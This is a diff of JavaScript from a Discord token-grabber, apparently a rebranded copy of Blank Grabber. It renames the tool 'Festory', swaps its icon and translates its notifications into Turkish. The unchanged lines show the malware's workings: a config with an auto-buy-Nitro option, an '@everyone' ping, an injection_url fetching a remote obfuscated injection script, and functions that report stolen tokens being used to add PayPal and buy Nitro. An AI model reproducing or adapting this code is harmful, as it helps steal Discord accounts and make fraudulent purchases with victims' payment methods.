@@ -16,8 +16,8 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Blank Grabber', 
-  embed_icon: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png', 
+  embed_name: 'Festory', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/840966782214733824/1098244076203159694/62464d2ffea60d56a7d7b07f0f566c3e.png', 
   embed_color: 0, 
   injection_url: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/Blank%20Grabber/Data/injection-obfuscated.js', 
 
@@ -785,7 +785,7 @@ const PaypalAdded = async (token) => {
         fields: [
           {
             name: '**Paypal Added**',
-            value: `Time to buy some nitro baby 😩`,
+            value: `Nitro alma vakti 😩`,
             inline: false,
           },
           {
@@ -864,7 +864,7 @@ const nitroBought = async (token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '**Nitro bought!**',
+            name: '**Nitro alındı!**',
             value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
             inline: true,
           },
